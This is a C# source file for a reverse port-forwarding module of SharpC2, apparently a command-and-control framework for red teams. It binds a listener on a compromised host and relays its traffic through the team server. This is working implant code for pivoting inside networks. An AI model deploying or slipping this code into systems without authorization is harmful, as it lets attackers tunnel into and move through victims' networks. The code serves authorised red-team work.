using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common;
using Common.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    public class Module : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }
        private Dictionary<ReversePortForward, Socket> ReversePortForwards { get; set; } = new Dictionary<ReversePortForward, Socket>();
        private List<ReversePortForwardPacket> InboundPackets { get; set; } = new List<ReversePortForwardPacket>();

        public void Init(AgentController agentController, ConfigController configController)
        {
            Agent = agentController;
            Config = configController;
        }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "rportfwd",
                Description = "Provides agent-side reverse port forwarding",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "start",
                        Description = "Start a new reverse port forward",
                        HelpText = "rportfwd-start [bind port] [forward host] [forward port]",
                        CallBack = StartReversePortForward
                    },
                    new AgentCommand
                    {
                        Name = "stop",
                        Description = "Stop a reverse port forward",
                        HelpText = "rportfwd-stop [bind port]",
                        CallBack = StopReversePortForward
                    },
                    new AgentCommand
                    {
                        Name = "flush",
                        Description = "Flush all reverse port forwards on this agent",
                        HelpText = "rportfwd-flush",
                        CallBack = FlushReversePortForwards
                    },
                    new AgentCommand
                    {
                        Name = "list",
                        Description = "List current reverse port forwards on this agent",
                        HelpText = "rportfwd-list",
                        CallBack = ListReversePortForwards
                    },
                    new AgentCommand
                    {
                        Name = "DataFromTeamServer",
                        Visible = false,
                        CallBack = DataFromTeamServer
                    }
                }
            };
        }

        private void ListReversePortForwards(byte[] data)
        {
            try
            {
                var result = new SharpC2ResultList<ReversePortForwardResult>();

                foreach (var rportfwd in ReversePortForwards)
                {
                    result.Add(new ReversePortForwardResult
                    { 
                        BindPort = rportfwd.Key.BindPort,
                        ForwardHost = rportfwd.Key.ForwardHost,
                        ForwardPort = rportfwd.Key.ForwardPort
                    });
                }

                if (result.Count > 0)
                {
                    Agent.SendOutput(result.ToString());
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void FlushReversePortForwards(byte[] data)
        {
            try
            {
                foreach (var rportfwd in ReversePortForwards)
                {
                    var socket = rportfwd.Value;
                    try { socket.Shutdown(SocketShutdown.Both); }
                    catch (SocketException) { }
                    socket.Close();
                }

                ReversePortForwards.Clear();
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void StopReversePortForward(byte[] data)
        {
            try
            {
                var bindPort = int.Parse(Encoding.UTF8.GetString(data));
                var rportfwd = ReversePortForwards.FirstOrDefault(r => r.Key.BindPort == bindPort).Key;
                if (rportfwd != null)
                {
                    rportfwd.CancellationToken.Cancel();
                    var socket = ReversePortForwards[rportfwd];
                    try { socket.Shutdown(SocketShutdown.Both); }
                    catch (SocketException) { }
                    socket.Close();

                    ReversePortForwards.Remove(rportfwd);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void StartReversePortForward(byte[] data)
        {
            try
            {
                var args = Encoding.UTF8.GetString(data).Split(' ');
                var bindPort = int.Parse(args[0]);
                var forwardHost = args[1];
                var forwardPort = int.Parse(args[2]);

                if (ReversePortForwards.Any(k => k.Key.BindPort == bindPort))
                {
                    Agent.SendError($"rportfwd already exists on port {bindPort}");
                    return;
                }

                var rportfwd = new ReversePortForward
                {
                    BindPort = bindPort,
                    ForwardHost = forwardHost,
                    ForwardPort = forwardPort,
                    CancellationToken = new CancellationTokenSource()
                };

                var bindAddress = IPAddress.Parse("0.0.0.0");
                var endPoint = new IPEndPoint(bindAddress, bindPort);
                var listener = new Socket(bindAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                listener.Bind(endPoint);
                listener.Listen(100);

                var token = rportfwd.CancellationToken.Token;

                Task.Factory.StartNew(delegate ()
                {
                    while (true)
                    {
                        if (token.IsCancellationRequested)
                        {
                            return;
                        }

                        try
                        {
                            var handler = listener.Accept();

                            var buffer = new byte[65535];
                            var bytesRecv = handler.Receive(buffer);

                            if (bytesRecv > 0)
                            {
                                var outPacket = new ReversePortForwardPacket
                                {
                                    ID = Guid.NewGuid().ToString(),
                                    ForwardHost = rportfwd.ForwardHost,
                                    ForwardPort = rportfwd.ForwardPort,
                                    Data = buffer.TrimBytes()
                                };

                                Agent.SendModuleData("ReversePortForward", "DataFromAgent", Serialisation.SerialiseData(outPacket));

                                // wait

                                while (true)
                                {
                                    var packets = InboundPackets.ToArray();

                                    if (packets.Any(p => p.ID.Equals(outPacket.ID, StringComparison.OrdinalIgnoreCase)))
                                    {
                                        var inPacket = InboundPackets.FirstOrDefault(p => p.ID.Equals(outPacket.ID, StringComparison.OrdinalIgnoreCase));
                                        InboundPackets.Remove(inPacket);

                                        handler.Send(inPacket.Data);
                                        handler.Shutdown(SocketShutdown.Both);
                                        handler.Close();

                                        break;
                                    }
                                }
                            }
                        }
                        catch (SocketException e)
                        {
                            // socket is probably disposed
                            Agent.SendError(e.Message);
                        }
                    }
                }, token);

                ReversePortForwards.Add(rportfwd, listener);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void DataFromTeamServer(byte[] data)
        {
            try
            {
                var packet = Serialisation.DeserialiseData<ReversePortForwardPacket>(data);
                InboundPackets.Add(packet);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}